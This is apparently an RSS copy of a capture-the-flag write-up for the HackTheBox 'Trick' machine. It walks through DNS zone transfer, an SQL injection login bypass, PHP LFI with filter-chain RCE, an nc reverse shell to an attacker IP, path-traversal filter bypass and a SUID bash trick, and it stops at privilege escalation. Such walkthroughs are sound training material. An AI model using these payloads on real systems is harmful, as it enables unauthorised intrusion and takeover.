@@ -1,0 +1,330 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Fail2ban on</title><link>https://h4r1337.github.io/tags/fail2ban/</link><description>Recent content in Fail2ban on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 11 Jun 2026 17:01:48 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/fail2ban/index.xml" rel="self" type="application/rss+xml"/><item><title>Trick | HackTheBox</title><link>https://h4r1337.github.io/posts/trick/</link><pubDate>Thu, 11 Jun 2026 17:01:48 +0530</pubDate><guid>https://h4r1337.github.io/posts/trick/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Trick">Trick&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/184611">&lt;img src="https://www.hackthebox.com/badge/image/184611" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Trick
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Trick is an easy linux machine that have several path for initial access. We will first exploit AXFR zone transfer to find a vhost, which is vulnerable to SQL injection and Local File Inclusion. We will use SQLi to bypass authentication and from there use the LFI combined with php filter chaining to get RCE as &lt;code>www-data&lt;/code>. From local enumeration we will find another vhost which is also vulnerable to LFI, which we will use to escalate to user &lt;code>michael&lt;/code>. From there we will abuse the &lt;code>fail2ban&lt;/code> service to escalate privilege as &lt;code>root&lt;/code>&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Trick">Trick&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/184611">&lt;img src="https://www.hackthebox.com/badge/image/184611" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Trick
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Trick is an easy linux machine that have several path for initial access. We will first exploit AXFR zone transfer to find a vhost, which is vulnerable to SQL injection and Local File Inclusion. We will use SQLi to bypass authentication and from there use the LFI combined with php filter chaining to get RCE as &lt;code>www-data&lt;/code>. From local enumeration we will find another vhost which is also vulnerable to LFI, which we will use to escalate to user &lt;code>michael&lt;/code>. From there we will abuse the &lt;code>fail2ban&lt;/code> service to escalate privilege as &lt;code>root&lt;/code>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;hr>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p- --min-rate &lt;span style="color:#d3869b">10000&lt;/span> -vv $IP -oA recon/nmap/ports
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.129.168.255
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.18s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2026-06-07 11:50:01 IST &lt;span style="color:#fe8019">for&lt;/span> 106s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">42091&lt;/span> filtered tcp ports &lt;span style="color:#fe8019">(&lt;/span>no-response&lt;span style="color:#fe8019">)&lt;/span>, &lt;span style="color:#d3869b">23440&lt;/span> closed tcp ports &lt;span style="color:#fe8019">(&lt;/span>conn-refused&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>25/tcp open smtp syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p22,25,53,80 -sC -sV --min-rate &lt;span style="color:#d3869b">10000&lt;/span> $IP -oA recon/nmap/service
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>Nmap scan report for 10.129.168.255
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received conn-refused (0.27s latency).
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2026-06-07 11:55:22 IST for 263s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>25/tcp open smtp? syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_smtp-commands: Couldn&amp;#39;t establish connection on port 25
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain syn-ack ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| dns-nsid:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack nginx 1.14.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.14.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Coming Soon - Start Bootstrap Theme
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="port-53">Port 53&lt;/h3>
+&lt;p>There&amp;rsquo;s a DNS server. We can use &lt;code>dig&lt;/code> to find domain name.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>dig -x 10.129.168.255 @10.129.168.255
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260607120553.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s add that to &lt;code>/etc/hosts&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$IP&lt;span style="color:#b8bb26">\ttrick.htb&amp;#34;&lt;/span> | sudo tee -a /etc/hosts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Port 53 is using TCP instead of the usual UDP, which means AXFR zone transfer attack might be possible, since &lt;a href="https://datatracker.ietf.org/doc/html/rfc5936#section-4">AXFR requests are restricted to TCP&lt;/a>. With this, we can list all the DNS records from the server:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>dig axfr trick.htb @10.129.168.255
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260607121838.webp">&lt;/figure>
+&lt;p>With this we found one more domain - &lt;code>preprod-payroll.trick.htb&lt;/code>&lt;/p>
+&lt;h2 id="port-80---http-nginx">Port 80 - HTTP (Nginx)&lt;/h2>
+&lt;p>There is nothing much in the &lt;code>trick.htb&lt;/code> domain.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260607115934.webp">&lt;/figure>
+&lt;p>There&amp;rsquo;s a login page in &lt;code>preprod-payroll.trick.htb&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260607123517.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="sql-injection-in-preprod-payrolltrickhtb">SQL Injection in &lt;code>preprod-payroll.trick.htb&lt;/code>&lt;/h3>
+&lt;p>We can bypass the login by simply supplying the payload &lt;code>' OR 1=1--&lt;/code> on both username and password fields.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260607143502.webp">&lt;/figure>
+&lt;p>And we are logged in as Administrator&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260607143533.webp">&lt;/figure>
+&lt;p>There&amp;rsquo;s was credentials in the admin panel:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611105745.webp">&lt;/figure>
+&lt;p>But it wasn&amp;rsquo;t working with ssh:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611105901.webp">&lt;/figure>
+&lt;h3 id="php-file-inclusion">PHP File Inclusion&lt;/h3>
+&lt;p>The &lt;code>page&lt;/code> parameter might be vulnerable to file inclusion.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611110340.webp">&lt;/figure>
+&lt;p>We can use &lt;code>filter://&lt;/code> wrapper to read php file contents. But the application appends &lt;code>.php&lt;/code> at the end of the parameter value, so we can only read php files.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=index
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611111719.webp">&lt;/figure>
+&lt;p>Source code of &lt;code>index.php&lt;/code> responsible for the file inclusion:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611112654.webp">&lt;/figure>
+&lt;p>It also mentions &lt;code>auth.php&lt;/code> which might contain database credentials.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113010.webp">&lt;/figure>
+&lt;p>But including &lt;code>auth&lt;/code> didn&amp;rsquo;t return anything.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113137.webp">&lt;/figure>
+&lt;p>I also tried &lt;code>../auth&lt;/code> and &lt;code>../../auth&lt;/code> to see if the file has been moved to some other directories, but nothing was there either. Then I tried including &lt;code>header.php&lt;/code> which gave some result:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113306.webp">&lt;/figure>
+&lt;p>But it was just HTML headers&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113421.webp">&lt;/figure>
+&lt;p>I also tried &lt;code>login.php&lt;/code> which included a &lt;code>db_connect.php&lt;/code> file:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113552.webp">&lt;/figure>
+&lt;p>Now this one was showing results:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113617.webp">&lt;/figure>
+&lt;p>And there is database credentials:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113710.webp">&lt;/figure>
+&lt;p>I checked if this can be used to SSH into the system, but it didn&amp;rsquo;t work either:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611113755.webp">&lt;/figure>
+&lt;h3 id="php-filter-chain-rce">PHP Filter Chain RCE&lt;/h3>
+&lt;p>We can use &lt;a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it">filter chains&lt;/a> to get remote code execution. The payload can be generated using the &lt;a href="https://github.com/synacktiv/php_filter_chain_generator">&lt;code>php_filter_chain_generator.py&lt;/code>&lt;/a> tool from synacktiv.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>python3 ~/tools/php_filter_chain_generator.py --chain &lt;span style="color:#b8bb26">&amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It will generate us a payload and we can use to see if this is working or not:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611114140.webp">&lt;/figure>
+&lt;p>And it is working. We can try to create a payload for running a reverse shell:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>python3 ~/tools/php_filter_chain_generator.py --chain &lt;span style="color:#b8bb26">&amp;#39;&amp;lt;?php $sock=fsockopen(&amp;#34;10.10.16.8&amp;#34;,6767);system(&amp;#34;bash &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;); ?&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>But the generated payload was too large:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611130257.webp">&lt;/figure>
+&lt;p>We can generate another payload that just executes the value from a &lt;code>cmd&lt;/code> parameter.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>python3 ~/tools/php_filter_chain_generator.py --chain &lt;span style="color:#b8bb26">&amp;#39;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;])?&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can use a POST request to add the &lt;code>cmd&lt;/code> value:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611130540.webp">&lt;/figure>
+&lt;p>I will use this payload for getting a reverse shell:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&amp;gt;&amp;amp;1|nc 10.10.16.8 &lt;span style="color:#d3869b">6767&lt;/span> &amp;gt;/tmp/f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611130829.webp">&lt;/figure>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611105224.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="lateral-movement-to-user">Lateral Movement to user&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;p>There are 2 users in this machine&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611131107.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s see running processes&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ps -aef --forest
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611131638.webp">&lt;/figure>
+&lt;p>From this we can see that there is a php pool running as michael. But we are currently logged in as &lt;code>www-data&lt;/code> by exploiting a vulnerability in &lt;code>preprod-payroll.trick.htb&lt;/code>. This hints that there might be another site which we can exploit to get shell access as michael.&lt;/p>
+&lt;p>We can check the nginx config to find the enabled sites:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cat /etc/nginx/sites-enabled/default
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611142547.webp">&lt;/figure>
+&lt;p>There we can see &lt;code>preprod-marketing.trick.htb&lt;/code>.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611142659.webp">&lt;/figure>
+&lt;h3 id="lfi-to-shell-as-michael">LFI to Shell as Michael&lt;/h3>
+&lt;p>Since we already have shell access, we can check the source code and see if there are any vulnerabilities in here.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ls -alp /var/www/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611142157.webp">&lt;/figure>
+&lt;p>The site is located in &lt;code>/var/www/market&lt;/code>, and we can see its source code:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611143019.webp">&lt;/figure>
+&lt;p>This site is again vulnerable to file inclusion. But this time instead of appending &lt;code>.php&lt;/code> at the end, they are prepending &lt;code>/var/www/maket/&lt;/code> at the start. Which means we can&amp;rsquo;t use wrappers like &lt;code>filter://&lt;/code> like we did before. They are also replacing &lt;code>../&lt;/code> from the filename, but this can be bypassed easily, since the &lt;code>str_replace&lt;/code> function is not replacing the substring recursively, instead it will just replace every occurrence of the substring in a single pass. In this case if we supply it an input like &lt;code>....//....//....//....//etc/passwd&lt;/code> it will become &lt;code>../../../../etc/passwd&lt;/code> after the string replace.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl -ik &lt;span style="color:#b8bb26">&amp;#39;http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">HTTP&lt;/span>&lt;span style="color:#fe8019">/&lt;/span>&lt;span style="color:#d3869b">1.1&lt;/span> &lt;span style="color:#d3869b">200&lt;/span> &lt;span style="color:#fb4934">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Server&lt;span style="color:#fe8019">:&lt;/span> nginx/1.14.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date&lt;span style="color:#fe8019">:&lt;/span> Thu, 11 Jun 2026 09:06:52 GMT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#fe8019">:&lt;/span> text/html; charset=UTF-8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Transfer-Encoding&lt;span style="color:#fe8019">:&lt;/span> chunked
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#fe8019">:&lt;/span> keep-alive
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:x:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#fb4934">...SNIP...&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>michael:x:1001:1001::/home/michael:/bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611143757.webp">&lt;/figure>
+&lt;p>Since we already have shell access, we can write a php reverse shell at &lt;code>/tmp&lt;/code> or any other location then call it from the above host and get shell as michael. I will create a php file that will make a suid bash and place it in &lt;code>/tmp&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;&amp;lt;?php system(&amp;#34;cp /bin/bash /tmp/bash;chmod u+s /tmp/bash&amp;#34;); ?&amp;gt;&amp;#39;&lt;/span> &amp;gt; /tmp/suid.php
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now send a request to this location:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl -ik &lt;span style="color:#b8bb26">&amp;#39;http://preprod-marketing.trick.htb/index.php?&amp;amp;page=....//....//....//....//tmp/suid.php&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It will give us a suid bash binary which we can use to escalate privilege as michael:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611151203.webp">&lt;/figure>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611151250.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="local-enumeration-1">Local Enumeration&lt;/h3>
+&lt;p>First we need to get a proper shell, so I&amp;rsquo;ll check &lt;code>.ssh/&lt;/code> of michael.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611151452.webp">&lt;/figure>
+&lt;p>We can see that there&amp;rsquo;s already an ssh key present. We can use it to login through SSH:&lt;/p>
